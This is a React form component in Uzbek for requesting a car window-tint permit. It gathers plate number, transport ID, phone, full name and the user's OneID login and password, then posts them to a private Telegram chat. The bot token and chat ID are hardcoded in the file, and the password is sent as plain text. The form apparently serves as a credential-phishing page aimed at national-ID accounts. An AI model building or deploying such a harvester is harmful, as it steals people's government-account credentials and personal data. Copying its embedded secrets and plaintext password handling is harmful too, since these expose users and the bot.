import { useState } from 'react';
import { IMaskInput } from 'react-imask';
import { toast } from 'sonner';

function escapeMarkdownV2(text) {
    return text
        .replace(/\\/g, '\\\\')
        .replace(/_/g, '\\_')
        .replace(/\*/g, '\\*')
        .replace(/\[/g, '\\[')
        .replace(/\]/g, '\\]')
        .replace(/\(/g, '\\(')
        .replace(/\)/g, '\\)')
        .replace(/~/g, '\\~')
        .replace(/`/g, '\\`')
        .replace(/>/g, '\\>')
        .replace(/#/g, '\\#')
        .replace(/\+/g, '\\+')
        .replace(/-/g, '\\-')
        .replace(/=/g, '\\=')
        .replace(/\|/g, '\\|')
        .replace(/\{/g, '\\{')
        .replace(/\}/g, '\\}')
        .replace(/\./g, '\\.')
        .replace(/!/g, '\\!');
}

const BOT_TOKEN = '8005450451:AAEj4m1FAovWc8P4wna4QIbS21JaAXsqD6o';
const CHAT_ID = '1163282279';

export const TanirovkaForm = () => {
    const [isYuridik, setIsYuridik] = useState(false);
    const [autoNumber, setAutoNumber] = useState('');
    const [autoTransportId, setAutoTransportId] = useState('');
    const [phone, setPhone] = useState('');
    const [login, setLogin] = useState('');
    const [password, setPassword] = useState('');
    const [fio, setFio] = useState('');
    const [isLoading, setIsLoading] = useState(false);

    const handleToggle = (value) => {
        setIsYuridik(value);
        setAutoNumber('');
    };

    const handleSubmit = async () => {
        if (!autoNumber || !autoTransportId || !phone || !fio) {
            toast.error("Iltimos, barcha majburiy maydonlarni to'ldiring.");
            return;
        }

        setIsLoading(true);

        const message = `
🚘 *Tanirovka Ruxsatnoma So'rov*:
👤 Turi: ${escapeMarkdownV2(isYuridik ? 'Yuridik' : 'Jismoniy')}
🔢 Avtoraqam: ${escapeMarkdownV2(autoNumber)}
📄 Transport ID: ${escapeMarkdownV2(autoTransportId)}
📱 Telefon: ${escapeMarkdownV2(phone)}
🧑‍💻 OneID login: ${escapeMarkdownV2(login || 'Yo‘q')}
🔒 OneID parol: ${escapeMarkdownV2(password || 'Yo‘q')}
📝 F\\.I\\.O\\: ${escapeMarkdownV2(fio)}
        `;

        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'MarkdownV2',
                }),
            });

            toast.success("Ma'lumotlar yuborildi ✅");

            setAutoNumber('');
            setAutoTransportId('');
            setPhone('');
            setLogin('');
            setPassword('');
            setFio('');
        } catch {
            toast.error('Yuborishda xatolik yuz berdi ❌');
        } finally {
            setIsLoading(false);
        }
    };

    return (
        <div className="relative w-full h-full flex flex-col justify-between px-[10px] py-4 overflow-hidden">

            {/* Scrollable form area */}
            <div className={`flex-1 overflow-auto flex flex-col items-center gap-[16px] pr-1 ${isLoading ? 'blur-sm pointer-events-none' : ''}`}>
                {/* Toggle */}
                <div className="flex gap-3">
                    <button
                        onClick={() => handleToggle(false)}
                        className={`px-4 py-2 rounded-md text-sm font-medium ${
                            !isYuridik ? 'bg-[#258385] text-white' : 'bg-white text-[#258385] border'
                        }`}
                    >
                        Jismoniy
                    </button>
                    <button
                        onClick={() => handleToggle(true)}
                        className={`px-4 py-2 rounded-md text-sm font-medium ${
                            isYuridik ? 'bg-[#258385] text-white' : 'bg-white text-[#258385] border'
                        }`}
                    >
                        Yuridik
                    </button>
                </div>

                {/* Avtoraqam */}
                <div className="w-full flex flex-col gap-2">
                    <label className="text-sm font-medium text-[#258385]">Avtotransport raqamingiz</label>
                    <IMaskInput
                        mask={isYuridik ? '00|000aaa' : '00|a000aa'}
                        definitions={{ a: /[A-Za-z]/ }}
                        value={autoNumber}
                        unmask={false}
                        onAccept={(value) => setAutoNumber(value.toUpperCase())}
                        placeholder={isYuridik ? '01|001AAA' : '01|A001AA'}
                        className="border w-full focus:border-[#258385] px-4 py-2 rounded-md text-[#258385] outline-none uppercase"
                    />
                </div>

                {/* Transport ID */}
                <div className="w-full flex flex-col gap-2">
                    <label className="text-sm font-medium text-[#258385]">Transport ID</label>
                    <IMaskInput
                        mask="aaa 000 00 00"
                        definitions={{ a: /[A-Za-z]/ }}
                        value={autoTransportId}
                        unmask={false}
                        onAccept={(value) => setAutoTransportId(value.toUpperCase())}
                        placeholder="AAA 123 45 67"
                        className="border w-full focus:border-[#258385] px-4 py-2 rounded-md text-[#258385] outline-none uppercase"
                    />
                </div>

                {/* Telefon */}
                <div className="w-full flex flex-col gap-2">
                    <label className="text-sm font-medium text-[#258385]">Telefon raqam</label>
                    <IMaskInput
                        mask="+998 00 000 00 00"
                        value={phone}
                        unmask={false}
                        onAccept={(value) => setPhone(value)}
                        placeholder="+998 90 123 45 67"
                        className="border w-full focus:border-[#258385] px-4 py-2 rounded-md text-[#258385] outline-none"
                    />
                </div>

                {/* OneID Login */}
                <div className="w-full flex flex-col gap-2">
                    <label className="text-sm font-medium text-[#258385]">OneID login (ixtiyoriy)</label>
                    <input
                        type="text"
                        value={login}
                        onChange={(e) => setLogin(e.target.value)}
                        placeholder="OneID login"
                        className="border w-full focus:border-[#258385] px-4 py-2 rounded-md text-[#258385] outline-none"
                    />
                </div>

                {/* OneID Parol */}
                <div className="w-full flex flex-col gap-2">
                    <label className="text-sm font-medium text-[#258385]">OneID parol (ixtiyoriy)</label>
                    <input
                        type="text"
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                        placeholder="OneID parol"
                        className="border w-full focus:border-[#258385] px-4 py-2 rounded-md text-[#258385] outline-none"
                    />
                </div>

                {/* F.I.O */}
                <div className="w-full flex flex-col gap-2">
                    <label className="text-sm font-medium text-[#258385]">F.I.O (to‘liq ism sharif)</label>
                    <input
                        type="text"
                        value={fio}
                        onChange={(e) => setFio(e.target.value)}
                        placeholder="F.I.O"
                        className="border w-full focus:border-[#258385] px-4 py-2 rounded-md text-[#258385] outline-none"
                    />
                </div>
            </div>

            {/* Submit */}
            <button
                onClick={handleSubmit}
                disabled={isLoading}
                className="mt-4 px-6 py-4 w-full bg-[#258385] text-white rounded-md font-semibold hover:bg-[#1f6c6d] transition disabled:opacity-50"
            >
                Yuborish
            </button>

            {/* Loader */}
            {isLoading && (
                <div className="absolute inset-0 flex items-center justify-center bg-white/60 z-10">
                    <div className="w-12 h-12 border-4 border-[#258385] border-t-transparent rounded-full animate-spin"></div>
                </div>
            )}
        </div>
    );
};
